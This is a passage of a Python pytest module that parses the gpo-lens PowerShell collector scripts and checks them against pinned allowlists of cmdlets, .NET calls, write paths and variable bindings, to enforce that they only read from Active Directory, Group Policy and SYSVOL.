"""Collector read-only enforcement by a PowerShell AST gate in two layers.

The collection scripts run on a domain controller or RSAT host with a domain
account. gpo-lens claims they are read-only against Active Directory, Group
Policy and SYSVOL. This test turns that claim from "by inspection" into a
mechanical check that **parses** (never executes) each in-scope script with the
PowerShell language parser (``tests/powershell/Get-ScriptCallInventory.ps1``).

1. **Golden syntax tree** (completeness). ``tests/powershell/collector-inventory.json``
   holds, per script, a canonical order-preserving serialization of the WHOLE
   AST (one line per node: its role in the parent, its type, and every
   semantically relevant property — operators, names, string values, flags,
   ``#Requires``, attributes, every argument) plus a digest of the exact source
   bytes (LF pinned by .gitattributes). ``test_inventory_matches_golden`` fails on ANY difference,
   so every edit — a reorder, a changed argument, a new index assignment or
   ``#Requires`` line, even a comment — must be regenerated and its diff
   reviewed. Meta-tests prove the serializer covers every AST node type and
   property of the running PowerShell and that sampled systematic mutations
   change the tree.

2. **Semantic floor** (``run_all_checks``). ``scripts/gen_collector_inventory.py``
   refuses to regenerate unless every check passes, so a regeneration can only
   admit what these allowlists and pins admit: commands (and a never-allowed
   list), dynamic invocations, static/instance .NET calls, property writes,
   redirections (``$null`` only), ``using`` (none), ``New-Object``/``Add-Type``
   forms, a type-reference denylist, a closed set of AST node types, the exact
   local functions, exact scheduled-task argument vectors, exact pinning of
   every binding of every write/receiver/exec variable and what it reads, no
   provider/global/automatic-variable writes, the exact text plus control-flow
   context of every command invocation and write/delete/exec/lifetime .NET
   call, digests of every local function body and script param block, the
   exact uses of secret-bearing variables, no remote paths in command
   arguments, and the shared TaskName validator. It is a floor,
   not a proof: an admitted change still shows up as a golden diff.

Scope:

* In scope (run on the DC/RSAT host): ``Export-GpoEstate.ps1``,
  ``Export-GroupMembers.ps1``, ``Export-Principals.ps1``,
  ``Run-GpoLensCollection.ps1``, ``GpoLensCollectionMarker.ps1``.
* ``Register-GpoLensCollection.ps1`` also runs on the DC/RSAT host but its job
  is to create a Windows scheduled task (a write to the host, not to AD). Each
  ScheduledTasks cmdlet call must match a pinned argument vector exactly.
* Out of scope: ``install-windows.ps1`` / ``uninstall-windows.ps1`` run on the
  *analysis* host (IIS install), never on a DC.

Residual limits are stated in ``docs/threat-model.md`` R5.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import shutil
import subprocess
from dataclasses import dataclass, field
from functools import cache
from pathlib import Path
from typing import Any

import pytest

_REPO = Path(__file__).resolve().parent.parent
_SCRIPTS = _REPO / "scripts"
_DUMPER = _REPO / "tests" / "powershell" / "Get-ScriptCallInventory.ps1"


@dataclass(frozen=True)
class ScriptPolicy:
    commands: frozenset[str]
    static_methods: frozenset[str] = frozenset()
    instance_methods: frozenset[str] = frozenset()
    dynamic_invocations: frozenset[str] = frozenset()
    dot_sources: tuple[str, ...] = ()
    new_object_types: frozenset[str] = frozenset()
    add_type_assemblies: frozenset[str] = frozenset()
    add_type_definitions: frozenset[str] = frozenset()
    member_assignments: frozenset[str] = frozenset()
    write_roots: dict[str, str] = field(default_factory=dict)


# Console output and pure pipeline/data cmdlets; no state outside the process.
_CONSOLE_AND_PIPELINE = frozenset(
    {
        "ConvertFrom-Json",
        "ConvertTo-Json",
        "ForEach-Object",
        "Get-Date",
        "Join-Path",
        "Measure-Object",
        "Out-Null",
        "Out-String",
        "Select-Object",
        "Sort-Object",
        "Where-Object",
        "Write-Error",
        "Write-Host",
        "Write-Progress",
        "Write-Warning",
    }
)
# Local file-system reads.
_FS_READ = frozenset({"Get-ChildItem", "Get-Content", "Get-Item", "Resolve-Path", "Test-Path"})


def _cmds(*names: str, shared: frozenset[str]) -> frozenset[str]:
    """Script-specific commands plus the subset of *shared* the script uses.

    Every name must still be used (the exact-match check), so taking a subset
    of a shared group never widens what a script may call.
    """
    return frozenset(names) | shared


POLICIES: dict[str, ScriptPolicy] = {
    "Export-GpoEstate.ps1": ScriptPolicy(
        commands=_cmds(
            # AD / Group Policy reads.
            "Get-ADDomain",
            "Get-ADGroupMember",
            "Get-ADObject",
            "Get-ADOrganizationalUnit",
            "Get-ADRootDSE",
            "Get-GPInheritance",
            "Get-GPO",
            "Get-GPOReport",
            "Get-Module",
            # Assembly load for ZIP creation; New-Object for SID parsing.
            "Add-Type",
            "New-Object",
            # Local writes, constrained by write_roots.
            "Copy-Item",
            "New-Item",
            "Remove-Item",
            "Set-Content",
            shared=(_CONSOLE_AND_PIPELINE - {"ConvertFrom-Json", "Out-String"})
            | (_FS_READ - {"Resolve-Path"}),
        ),
        static_methods=frozenset(
            {
                "Collections.Generic.HashSet[string]::new",
                "Collections.Generic.List[object]::new",
                "Collections.Generic.List[string]::new",
                "IO.Compression.ZipFile::Open",
                "IO.Compression.ZipFileExtensions::CreateEntryFromFile",
                "IO.File::WriteAllText",
                "math::Round",
                "regex::Matches",
            }
        ),
        instance_methods=frozenset(
            # Collections, strings, ZIP dispose, SecurityIdentifier.Translate
            # (SID -> account name lookup, a read).
            {"Add", "Contains", "Dispose", "Replace", "Split", "Substring", "Translate", "Trim"}
        ),
        new_object_types=frozenset({"System.Security.Principal.SecurityIdentifier"}),
        add_type_assemblies=frozenset({"System.IO.Compression.FileSystem"}),
        write_roots={
            "OutputRoot": "the -OutputRoot parameter (created if absent)",
            "testFile": "Join-Path $OutputRoot '_writetest_.tmp' (writability probe, removed)",
            "out": "Join-Path $OutputRoot '<domain>-<stamp>' (this run's export folder)",
            "dest": "Join-Path $out 'SYSVOL-Policies' (the SYSVOL copy target)",
            "archive": '"$ExportPath.zip" where New-GpoExportZip receives -ExportPath $out',
        },
    ),
    "Export-GroupMembers.ps1": ScriptPolicy(
        commands=_cmds(
            "Get-ADGroupMember",
            "Get-Content",
            "Set-Content",
            shared=frozenset(
                {"ConvertFrom-Json", "ConvertTo-Json", "Get-Date", "Where-Object", "Write-Host"}
            ),
        ),
        # Splatting an optional -Credential into the AD read cmdlets.
        member_assignments=frozenset({"$adParams.Credential"}),
        write_roots={"OutputPath": "the -OutputPath parameter (default group-members.json)"},
    ),
    "Export-Principals.ps1": ScriptPolicy(
        commands=_cmds(
            "Get-ADDomain",
            "Get-ADObject",
            "New-Object",
            "Set-Content",
            shared=frozenset(
                {
                    "ConvertTo-Json",
                    "Get-ChildItem",
                    "Get-Content",
                    "Get-Date",
                    "Join-Path",
                    "Sort-Object",
                    "Test-Path",
                    "Where-Object",
                    "Write-Host",
                }
            ),
        ),
        static_methods=frozenset({"Collections.Generic.HashSet[string]::new", "regex::Matches"}),
        # RawSecurityDescriptor -> SDDL text and SID -> account name: reads.
        instance_methods=frozenset({"Add", "GetSecurityDescriptorSddlForm", "Translate"}),
        new_object_types=frozenset({"System.Security.Principal.SecurityIdentifier"}),
        member_assignments=frozenset({"$adParams.Credential"}),
        write_roots={"OutputPath": "the -OutputPath parameter (default principals.json)"},
    ),
    "Run-GpoLensCollection.ps1": ScriptPolicy(
        commands=_cmds(
            "Add-Type",
            "Copy-Item",
            "Move-Item",
            "New-Item",
            "Remove-Item",
            shared=(_CONSOLE_AND_PIPELINE - {"ConvertTo-Json", "Measure-Object", "Write-Progress"})
            | (_FS_READ - {"Get-Content"}),
        ),
        dynamic_invocations=frozenset(
            {
                # Runs the registered collector (default Export-GpoEstate.ps1).
                "& $CollectorPath -OutputRoot $OutputRoot *>&1",
                ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            }
        ),
        dot_sources=("GpoLensCollectionMarker.ps1",),
        static_methods=frozenset(
            {
                "Collections.Generic.HashSet[guid]::new",
                "Collections.Generic.Stack[string]::new",
                "IO.Compression.ZipFile::Open",
                "IO.Compression.ZipFile::OpenRead",
                "IO.File::AppendAllText",
                "IO.File::Open",
                "IO.File::ReadAllBytes",
                "IO.File::WriteAllBytes",
                "Text.UTF8Encoding::new",
                "guid::NewGuid",
                "guid::TryParse",
                "math::Max",
                "string::Equals",
            }
        ),
        instance_methods=frozenset(
            {
                "Add",
                "ContainsKey",
                # ZipArchive.CreateEntry / ZipArchiveEntry.Delete+Open on the
                # ZIP this run just created (inventory overlay).
                "CreateEntry",
                "Delete",
                "Dispose",
                "GetByteCount",
                "GetEntry",
                "GetString",
                "Open",
                "Pop",
                "Push",
                "Substring",
                "ToString",
                "TrimEnd",
                "TrimStart",
                "Write",
            }
        ),
        add_type_assemblies=frozenset({"System.IO.Compression.FileSystem"}),
        write_roots={
            "OutputRoot": "the -OutputRoot parameter (owner-marker checked before any write)",
            "LogPath": "Join-Path $OutputRoot 'collection.log'",
            "old": "$LogPath or $LogPath.<n> (log rotation)",
            "next": "$LogPath.<n> (log rotation)",
            "newest": "the single new completed ZIP under $OutputRoot",
            "exportDir": "Join-Path $OutputRoot $newest.BaseName",
            "archive": "an expired completed export ZIP under $OutputRoot (retention)",
            "folder": "Join-Path $OutputRoot $archive.BaseName (retention)",
            "CopyTo": "the -CopyTo delivery directory",
            "partial": "<$delivery>.<guid>.partial inside -CopyTo",
            "delivery": "Join-Path $CopyTo $newest.Name",
        },
    ),
    "GpoLensCollectionMarker.ps1": ScriptPolicy(
        commands=_cmds(
            "Add-Type",
            # Linux-only test path: link count of the already-open marker inode.
            "stat",
            shared=frozenset({"Get-Item", "Join-Path", "Test-Path"}),
        ),
        static_methods=frozenset(
            {
                "GpoLens.MarkerFileInfo::LinkCount",
                "IO.File::Delete",
                "IO.File::Open",
                "IO.MemoryStream::new",
                "uint32::TryParse",
            }
        ),
        instance_methods=frozenset(
            {"CopyTo", "DangerousGetHandle", "Dispose", "ToArray", "ToInt64", "Write"}
        ),
        # GetFileInformationByHandle P/Invoke (read-only link-count query).
        add_type_definitions=frozenset(
            {"8e3d8b0b78dcf2319d6a1e414007e80fdb055c76715b83f81e94ba32d42c5f67"}
        ),
        write_roots={
            "Marker": "the owner marker path passed by callers (opened for read only)",
            "marker": "Join-Path <output root> '.gpo-lens-collection-owner'",
        },
    ),
    # Separate, narrow policy: registering the task is a deliberate write to the
    # host's Task Scheduler (not to AD). Nothing else here writes beyond the
    # output root's owner marker and lock file.
    "Register-GpoLensCollection.ps1": ScriptPolicy(
        commands=_cmds(
            "New-ScheduledTask",
            "New-ScheduledTaskAction",
            "New-ScheduledTaskPrincipal",
            "New-ScheduledTaskSettingsSet",
            "New-ScheduledTaskTrigger",
            "Register-ScheduledTask",
            "Unregister-ScheduledTask",
            # Service-account password prompt, handed only to Task Scheduler.
            "Get-Credential",
            "New-Item",
            shared=frozenset(
                {"Get-Item", "Join-Path", "Out-Null", "Resolve-Path", "Test-Path"}
                | {"Write-Host", "Write-Warning"}
            ),
        ),
        dynamic_invocations=frozenset(
            {
                # Invokes the in-file scriptblock literal passed to
                # Set-GpoLensCollectionOwner (its body is scanned here).
                "& $RegisterTask",
                ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            }
        ),
        dot_sources=("GpoLensCollectionMarker.ps1",),
        static_methods=frozenset(
            {
                "IO.File::Delete",
                "IO.File::Open",
                "IO.Path::GetFullPath",
                "Text.UTF8Encoding::new",
                "datetime::TryParseExact",
                "string::Equals",
                "timespan::FromDays",
                "timespan::FromHours",
            }
        ),
        instance_methods=frozenset(
            {
                "Dispose",
                "GetBytes",
                "GetNetworkCredential",
                "GetString",
                "ShouldProcess",
                "TrimEnd",
                "TrimStart",
            }
        ),
        write_roots={
            "OutputRoot": "the -OutputRoot parameter (normalized with GetFullPath)",
            "marker": "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
        },
    ),
}

OUT_OF_SCOPE = {
    "install-windows.ps1": "runs on the analysis host to install the IIS site, not on a DC",
    "uninstall-windows.ps1": "runs on the analysis host to remove the IIS site, not on a DC",
}

# ---------------------------------------------------------------------------
# Dataflow confinement of write roots and other sink-bound variables (BL-1,
# Sol root_rebind/collector_rebind/registry). A name-only "the target mentions
# $OutputRoot" check is defeated by reassigning the variable; so every
# write-root and exec-pinned variable is pinned here to the exact set of
# assignment right-hand sides its documented derivation uses. Any extra or
# changed `=` assignment (a rebind to UNC/SYSVOL/provider/absolute) is not in
# the set and fails. Parameter defaults and foreach conditions are not pinned
# verbatim but must be path-safe (no UNC, provider, or `..`).
# ---------------------------------------------------------------------------


def _norm(text: str | None) -> str:
    return " ".join((text or "").split())


# Variables used as a write TARGET must all be declared write roots (keys here).
# Values are a short description of the derivation.
WRITE_ROOTS: dict[str, dict[str, str]] = {
    "Export-GpoEstate.ps1": {
        "outputroot": "-OutputRoot parameter (default C:\\gpo-export)",
        "testfile": "Join-Path $OutputRoot '_writetest_.tmp'",
        "out": "Join-Path $OutputRoot '<domain>-<stamp>'",
        "dest": "Join-Path $out 'SYSVOL-Policies'",
        "archive": '"$ExportPath.zip" (ExportPath = $out)',
    },
    "Export-GroupMembers.ps1": {"outputpath": "-OutputPath parameter"},
    "Export-Principals.ps1": {"outputpath": "-OutputPath parameter"},
    "Run-GpoLensCollection.ps1": {
        "outputroot": "-OutputRoot parameter",
        "logpath": "Join-Path $OutputRoot 'collection.log' (function param)",
        "old": "$LogPath or $LogPath.<n> (rotation)",
        "next": "$LogPath.<n> (rotation)",
        "newest": "the one new completed ZIP under $OutputRoot",
        "exportdir": "Join-Path $OutputRoot $newest.BaseName",
        "copyto": "-CopyTo delivery directory",
        "partial": "<delivery>.<guid>.partial under $CopyTo",
        "delivery": "Join-Path $CopyTo $newest.Name",
        "archive": "an expired completed export ZIP under $OutputRoot (foreach)",
        "folder": "Join-Path $OutputRoot $archive.BaseName",
    },
    "GpoLensCollectionMarker.ps1": {
        "marker": "Join-Path <output root> '.gpo-lens-collection-owner'",
    },
    "Register-GpoLensCollection.ps1": {
        "outputroot": "[IO.Path]::GetFullPath(-OutputRoot)",
        "marker": "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
    },
}

# Every variable whose binding matters is pinned to the EXACT set of its
# bindings (see the binding-key legend at _binding_key): write roots, receivers
# of every instance-method call / property write / index write, splatted
# variables, exec and scheduled-task inputs, dot-sourced function parameters
# pinned by their defining script, and transitively every variable those
# bindings read (_required_vars computes the set; check_pinned_bindings
# requires it to be covered here). Both directions are strict: an extra binding
# (a rebind) and a stale entry both fail. The comment on each entry is why the
# variable is required.
PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
    "Export-GpoEstate.ps1": {
        # argument of write-progress
        "activity": frozenset(
            {
                '[set-sectionprogress] arg "AD sites"',
                '[set-sectionprogress] arg "GPO metadata"',
                '[set-sectionprogress] arg "GPO settings (XML reports)"',
                '[set-sectionprogress] arg "Group membership"',
                '[set-sectionprogress] arg "Inheritance (gp-inheritance)"',
                '[set-sectionprogress] arg "OU tree"',
                '[set-sectionprogress] arg "Principals (SID -> name)"',
                '[set-sectionprogress] arg "SYSVOL copy"',
                '[set-sectionprogress] arg "WMI filters"',
                "[set-sectionprogress] param",
            }
        ),
        # condition $allGpc
        "allgpc": frozenset(
            {
                (
                    "[script] = Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                    '"(objectClass=groupPolicyContainer)" ` -Properties displayName '
                    "-ErrorAction Stop"
                ),
            }
        ),
        # condition $allGpos
        "allgpos": frozenset(
            {
                "[script] = Get-GPO -All",
            }
        ),
        # receiver of .add()
        "allsids": frozenset(
            {
                (
                    "[script] = "
                    "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]:"
                    ":OrdinalIgnoreCase)"
                ),
            }
        ),
        # argument of test-path
        "allxmlpath": frozenset(
            {
                "[script] = Join-Path $out 'AllGPOs.xml'",
            }
        ),
        # write root
        "archive": frozenset(
            {
                '[new-gpoexportzip] = "$ExportPath.zip"',
            }
        ),
        # receiver of .add()
        "collectionerrors": frozenset(
            {
                "[script] = [System.Collections.Generic.List[object]]::new()",
            }
        ),
        # argument of get-adobject
        "confignc": frozenset(
            {
                "[script] = (Get-ADRootDSE).configurationNamingContext",
            }
        ),
        # argument of .matches()
        "content": frozenset(
            {
                "[script] = Get-Content -LiteralPath $f.FullName -Raw -ErrorAction Stop",
                "[script] = Get-Content -LiteralPath $metaPath -Raw",
            }
        ),
        # argument of .add()
        "copiedcount": frozenset(
            {
                (
                    "[script] = @(Get-ChildItem -LiteralPath $dest -Recurse -File -ErrorAction "
                    "SilentlyContinue).Count"
                ),
            }
        ),
        # write root
        "dest": frozenset(
            {
                "[script] = Join-Path $out 'SYSVOL-Policies'",
            }
        ),
        # argument of write-warning
        "detail": frozenset(
            {
                (
                    '[script] = if ($policyFolders.Count -eq 0) { "enumerated 0 policy folders '
                    'at $src" + $(if ($srcErr) { " ($($srcErr[0].Exception.Message))" } else { '
                    '"" }) } else { "copy wrote 0 files to SYSVOL-Policies" }'
                ),
            }
        ),
        # argument of write-host
        "diskfiles": frozenset(
            {
                (
                    "[new-gpoexportzip] = @(Get-ChildItem -LiteralPath $ExportPath -Recurse "
                    "-File ` -ErrorAction SilentlyContinue -ErrorVariable +zipEnumErr)"
                ),
            }
        ),
        # receiver of .split()
        "dom": frozenset(
            {
                "[script] = Get-ADDomain",
            }
        ),
        # argument of write-host
        "domainsids": frozenset(
            {
                (
                    "[script] = @($allSids | Where-Object { $_ -match '^S-1-5-21-' -and "
                    "$principals[$_].type -eq 'Unresolved' })"
                ),
            }
        ),
        # condition $DryRun
        "dryrun": frozenset(
            {
                "[script] param",
            }
        ),
        # argument of .createentryfromfile()
        "entryname": frozenset(
            {
                "[new-gpoexportzip] = $f.FullName.Substring($rootLen).Replace('\\', '/')",
            }
        ),
        # argument of get-childitem
        "exportpath": frozenset(
            {
                "[new-gpoexportzip] arg $out",
                "[new-gpoexportzip] param",
            }
        ),
        # receiver of .replace()
        "f": frozenset(
            {
                "[new-gpoexportzip] foreach $diskFiles",
                "[script] foreach $xmlFiles",
            }
        ),
        # receiver of .add()
        "failedsections": frozenset(
            {
                "[script] = [System.Collections.Generic.List[string]]::new()",
            }
        ),
        # argument of .add()
        "g": frozenset(
            {
                "[script] = Get-GPInheritance -Target $t",
                "[script] foreach $allGpos",
            }
        ),
        # receiver of .trim()
        "gpc": frozenset(
            {
                "[script] foreach $allGpc",
            }
        ),
        # write target (Join-Path $out "reports\${safe}__$($gpo.Id).xml")
        "gpo": frozenset(
            {
                "[script] foreach $allGpos",
            }
        ),
        # argument of write-host
        "gpocount": frozenset(
            {
                "[script] = $allGpos.Count",
            }
        ),
        # index write $groupMembers[$gSid]
        "groupmembers": frozenset(
            {
                "[script] = [ordered]@{}",
                "[script] index $groupMembers[$gSid]",
                "[script] index $groupMembers['s-1-1-0']",
                "[script] index $groupMembers['s-1-5-11']",
            }
        ),
        # argument of write-host
        "groupsexpanded": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of write-host
        "groupsfailed": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of write-host
        "groupsids": frozenset(
            {
                (
                    "[script] = @($principals.Keys | Where-Object { $principals[$_].type -eq "
                    "'Group' })"
                ),
            }
        ),
        # argument of get-adgroupmember
        "gsid": frozenset(
            {
                "[script] foreach $groupSids",
            }
        ),
        # argument of write-warning
        "guid": frozenset(
            {
                "[script] = $gpc.Name.Trim('{}')",
            }
        ),
        # argument of write-progress
        "i": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # receiver of .add()
        "knownids": frozenset(
            {
                (
                    "[script] = "
                    "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]:"
                    ":OrdinalIgnoreCase)"
                ),
            }
        ),
        # argument of .add()
        "m": frozenset(
            {
                "[script] foreach [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')",
            }
        ),
        # argument of test-path
        "metapath": frozenset(
            {
                "[script] = Join-Path $out 'gpo-metadata.json'",
            }
        ),
        # argument of get-module
        "mod": frozenset(
            {
                "[script] foreach @('GroupPolicy','ActiveDirectory')",
            }
        ),
        # argument of write-host
        "nozip": frozenset(
            {
                "[script] param",
            }
        ),
        # condition $obj
        "obj": frozenset(
            {
                (
                    "[script] = Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties "
                    "objectClass, sAMAccountName, name -ErrorAction Stop"
                ),
            }
        ),
        # condition $objClass
        "objclass": frozenset(
            {
                "[script] = $obj.objectClass[-1]",
            }
        ),
        # argument of write-host
        "oucount": frozenset(
            {
                "[script] = @(Get-ADOrganizationalUnit -Filter *).Count",
            }
        ),
        # write root
        "out": frozenset(
            {
                '[script] = Join-Path $OutputRoot "$($dom.DNSRoot)-$stamp"',
            }
        ),
        # write root
        "outputroot": frozenset(
            {
                '[script] param "C:\\gpo-export"',
            }
        ),
        # argument of write-progress
        "pct": frozenset(
            {
                "[set-sectionprogress] = [math]::Round(($Section / $totalSections) * 100)",
            }
        ),
        # receiver of .trim()
        "pf": frozenset(
            {
                "[script] foreach $policyFolders",
            }
        ),
        # argument of get-adobject
        "policiesdn": frozenset(
            {
                '[script] = "CN=Policies,CN=System,$($dom.DistinguishedName)"',
            }
        ),
        # condition $policyFolders
        "policyfolders": frozenset(
            {
                (
                    "[script] = @(Get-ChildItem -LiteralPath $src -Directory ` -ErrorAction "
                    "SilentlyContinue -ErrorVariable +srcErr)"
                ),
            }
        ),
        # index write $principals[$sid]
        "principals": frozenset(
            {
                "[script] = [ordered]@{}",
                "[script] index $principals[$sid]",
            }
        ),
        # argument of write-host
        "resolved": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of .substring()
        "rootlen": frozenset(
            {
                "[new-gpoexportzip] = $ExportPath.Length + 1",
            }
        ),
        # argument of write-host
        "s": frozenset(
            {
                "[script] foreach $failedSections",
                "[script] foreach $successSections",
            }
        ),
        # write target (Join-Path $out "reports\${safe}__$($gpo.Id).xml")
        "safe": frozenset(
            {
                "[script] = ($gpo.DisplayName -replace '[\\\\/:*?\"<>|\\[\\]]', '_')",
            }
        ),
        # condition $sam -match '\$$'
        "sam": frozenset(
            {
                '[script] = ""',
                "[script] = $matches[1]",
                "[script] = $matches[2]",
                "[script] = $translated",
                "[script] = if ($obj.sAMAccountName) { $obj.sAMAccountName } else { $obj.Name }",
            }
        ),
        # argument of .round()
        "section": frozenset(
            {
                "[set-sectionprogress] arg $sectionNum",
                "[set-sectionprogress] param",
            }
        ),
        # argument of set-sectionprogress
        "sectionnum": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of new-object
        "sid": frozenset(
            {
                "[script] foreach $domainSids",
                "[script] foreach ($allSids | Sort-Object)",
            }
        ),
        # receiver of .translate()
        "sidobj": frozenset(
            {
                "[script] = New-Object System.Security.Principal.SecurityIdentifier($sid)",
            }
        ),
        # argument of write-host
        "sitecount": frozenset(
            {
                (
                    "[script] = @(Get-ADObject -SearchBase "
                    '"CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter '
                    '"(objectClass=site)" -ErrorAction SilentlyContinue).Count'
                ),
            }
        ),
        # argument of write-host
        "skipsysvol": frozenset(
            {
                "[script] param",
            }
        ),
        # argument of get-childitem
        "src": frozenset(
            {
                '[script] = "\\\\$($dom.DNSRoot)\\SYSVOL\\$($dom.DNSRoot)\\Policies"',
            }
        ),
        # condition $srcErr
        "srcerr": frozenset(
            {
                "[script] = $null",
                "[script] common -errorvariable",
            }
        ),
        # argument of join-path
        "stamp": frozenset(
            {
                '[script] = Get-Date -Format "yyyyMMdd-HHmmss"',
            }
        ),
        # receiver of .add()
        "successsections": frozenset(
            {
                "[script] = [System.Collections.Generic.List[string]]::new()",
            }
        ),
        # argument of .add()
        "sysvolerrors": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of .round()
        "sysvolsize": frozenset(
            {
                (
                    "[script] = (Get-ChildItem $src -Recurse -File -ErrorAction "
                    "SilentlyContinue | Measure-Object -Property Length -Sum).Sum"
                ),
            }
        ),
        # argument of write-host
        "sysvolsizestr": frozenset(
            {
                '[script] = "$([math]::Round($sysvolSize / 1MB, 2)) MB"',
                '[script] = "skipped"',
            }
        ),
        # argument of get-gpinheritance
        "t": frozenset(
            {
                "[script] foreach $targets",
            }
        ),
        # condition $targets
        "targets": frozenset(
            {
                (
                    "[script] = @($dom.DistinguishedName) + (Get-ADOrganizationalUnit -Filter "
                    "* | Select-Object -Expand DistinguishedName)"
                ),
            }
        ),
        # write root
        "testfile": frozenset(
            {
                '[script] = Join-Path $OutputRoot "_writetest_.tmp"',
            }
        ),
        # argument of write-progress
        "totalsections": frozenset(
            {
                "[script] = 9",
            }
        ),
        # condition $translated -match '^(.+?)\\(.+)$'
        "translated": frozenset(
            {
                "[script] = $sidObj.Translate([System.Security.Principal.NTAccount]).Value",
            }
        ),
        # argument of write-host
        "unresolved": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixMinusMinus",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of write-host
        "wmicount": frozenset(
            {
                (
                    "[script] = @(Get-ADObject -Filter \"objectClass -eq 'msWMI-Som'\" "
                    "-Properties 'msWMI-Name' -ErrorAction SilentlyContinue).Count"
                ),
            }
        ),
        # condition $xmlFiles
        "xmlfiles": frozenset(
            {
                "[script] += Get-Item -LiteralPath $allXmlPath",
                (
                    "[script] = @(Get-ChildItem -LiteralPath (Join-Path $out 'reports') "
                    "-Filter '*.xml' -ErrorAction SilentlyContinue)"
                ),
            }
        ),
        # receiver of .dispose()
        "zip": frozenset(
            {
                "[new-gpoexportzip] = [System.IO.Compression.ZipFile]::Open($archive, 'Create')",
            }
        ),
        # condition $zipEnumErr
        "zipenumerr": frozenset(
            {
                "[new-gpoexportzip] = $null",
                "[new-gpoexportzip] common -errorvariable",
            }
        ),
    },
    "Export-GroupMembers.ps1": {
        # property write $adParams.Credential
        "adparams": frozenset(
            {
                "[script] = @{}",
                "[script] member $adParams.Credential",
            }
        ),
        # condition $Credential
        "credential": frozenset(
            {
                "[script] param",
            }
        ),
        # argument of write-host
        "expanded": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of write-host
        "failed": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # index write $groupMembers[$sid]
        "groupmembers": frozenset(
            {
                "[script] = [ordered]@{}",
                '[script] index $groupMembers["s-1-1-0"]',
                '[script] index $groupMembers["s-1-5-11"]',
                "[script] index $groupMembers[$sid]",
            }
        ),
        # argument of write-host
        "groups": frozenset(
            {
                (
                    "[script] = $principalsData.principals.PSObject.Properties | Where-Object "
                    '{ $_.Value.type -eq "Group" }'
                ),
            }
        ),
        # read by a binding of $sid
        "grp": frozenset(
            {
                "[script] foreach $groups",
            }
        ),
        # condition $m.SID
        "m": frozenset(
            {
                "[script] foreach $members",
            }
        ),
        # condition $members
        "members": frozenset(
            {
                (
                    "[script] = Get-ADGroupMember -Identity $sid -Recursive @adParams "
                    "-ErrorAction Stop"
                ),
            }
        ),
        # argument of write-host
        "membersids": frozenset(
            {
                "[script] += $m.SID.Value",
                "[script] = @()",
            }
        ),
        # argument of write-host
        "name": frozenset(
            {
                "[script] = $grp.Value.name",
            }
        ),
        # write root
        "outputpath": frozenset(
            {
                '[script] param "group-members.json"',
            }
        ),
        # read by a binding of $groups
        "principalsdata": frozenset(
            {
                "[script] = Get-Content $PrincipalsPath -Raw -Encoding UTF8 | ConvertFrom-Json",
            }
        ),
        # argument of get-content
        "principalspath": frozenset(
            {
                '[script] param "principals.json"',
            }
        ),
        # argument of write-host
        "sid": frozenset(
            {
                "[script] = $grp.Name",
            }
        ),
    },
    "Export-Principals.ps1": {
        # property write $adParams.Credential
        "adparams": frozenset(
            {
                "[script] = @{}",
                "[script] member $adParams.Credential",
            }
        ),
        # receiver of .add()
        "allsids": frozenset(
            {
                (
                    "[script] = "
                    "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]:"
                    ":OrdinalIgnoreCase)"
                ),
            }
        ),
        # argument of test-path
        "allxml": frozenset(
            {
                '[script] = Join-Path $SddlSource "AllGPOs.xml"',
            }
        ),
        # argument of .matches()
        "content": frozenset(
            {
                "[script] = Get-Content $f -Raw -ErrorAction Stop",
                "[script] = Get-Content $metaFile -Raw",
            }
        ),
        # condition $Credential
        "credential": frozenset(
            {
                "[script] param",
            }
        ),
        # condition -not $dom
        "dom": frozenset(
            {
                "[script] = $null",
                "[script] = Get-ADDomain @adParams",
            }
        ),
        # argument of write-host
        "domainsids": frozenset(
            {
                (
                    "[script] = @($allSids | Where-Object { $_ -match '^S-1-5-21-' -and "
                    "$principals[$_].type -eq 'Unresolved' })"
                ),
            }
        ),
        # argument of get-content
        "f": frozenset(
            {
                "[script] foreach $xmlFiles",
            }
        ),
        # read by a binding of $sd
        "gpc": frozenset(
            {
                "[script] foreach $gpcObjs",
            }
        ),
        # condition $gpcObjs
        "gpcobjs": frozenset(
            {
                (
                    "[script] = Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                    '"(objectClass=groupPolicyContainer)" -Properties nTSecurityDescriptor, '
                    "displayName @adParams"
                ),
            }
        ),
        # argument of .add()
        "m": frozenset(
            {
                "[script] foreach $matches",
            }
        ),
        # argument of test-path
        "metafile": frozenset(
            {
                '[script] = Join-Path $SddlSource "gpo-metadata.json"',
            }
        ),
        # condition $obj
        "obj": frozenset(
            {
                (
                    "[script] = Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties "
                    "objectClass, sAMAccountName, name @adParams -ErrorAction Stop"
                ),
            }
        ),
        # condition $objClass
        "objclass": frozenset(
            {
                "[script] = $obj.objectClass[-1]",
            }
        ),
        # write root
        "outputpath": frozenset(
            {
                '[script] param "principals.json"',
            }
        ),
        # argument of get-adobject
        "policiesdn": frozenset(
            {
                '[script] = "CN=Policies,CN=System,$($dom.DistinguishedName)"',
            }
        ),
